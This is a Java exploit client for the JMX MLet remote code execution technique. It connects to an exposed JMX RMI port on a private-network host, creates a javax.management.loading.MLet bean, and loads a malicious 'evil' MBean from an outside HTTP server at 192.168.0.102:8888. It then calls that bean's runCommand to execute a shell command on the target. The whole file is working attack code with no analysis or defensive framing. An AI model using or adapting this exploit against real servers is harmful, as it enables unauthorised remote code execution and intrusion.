import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import java.net.InetAddress;
import java.util.HashSet;
import java.util.Iterator;

public class Client {

    private static String OBJECTNAME = "MLetEvil1:name=evil,id=11";

    public static void main(String[] args) {
        try {
            connectAndOwn("192.168.13.213", "31999", "touch /home/maoge/"+System.currentTimeMillis());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static void connectAndOwn(String serverName, String port, String command) {
        try {
            JMXServiceURL u = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + serverName + ":" + port + "/jmxrmi");
            System.out.println("URL: " + u + ", connecting");

            JMXConnector c = JMXConnectorFactory.connect(u, null);
            System.out.println("Connected: " + c.getConnectionId());

            MBeanServerConnection m = c.getMBeanServerConnection();

            ObjectInstance evil_bean = null;
            try {
                evil_bean = m.getObjectInstance(new ObjectName(OBJECTNAME));
            } catch (Exception e) {
                evil_bean = null;
            }
            if (evil_bean == null) {
                ObjectInstance evil = null;
                try {
                    evil = m.createMBean("javax.management.loading.MLet", null);
                } catch (javax.management.InstanceAlreadyExistsException e) {
                    evil = m.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
                }
                Object res = m.invoke(evil.getObjectName(), "getMBeansFromURL",
                        new Object[] {String.format("http://%s:8888/mlet", "192.168.0.102")},
                        new String[] {String.class.getName()}
                );
                HashSet res_set = (HashSet)res;
                Iterator itr = res_set.iterator();
                Object nextObject = itr.next();
                if (nextObject instanceof Exception) {
                    throw ((Exception)nextObject);
                }
                evil_bean = ((ObjectInstance)nextObject);
            }
            Object result = m.invoke(evil_bean.getObjectName(), "runCommand", new Object[]{command}, new String[]{String.class.getName()});
            System.out.println("Result: " + result);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
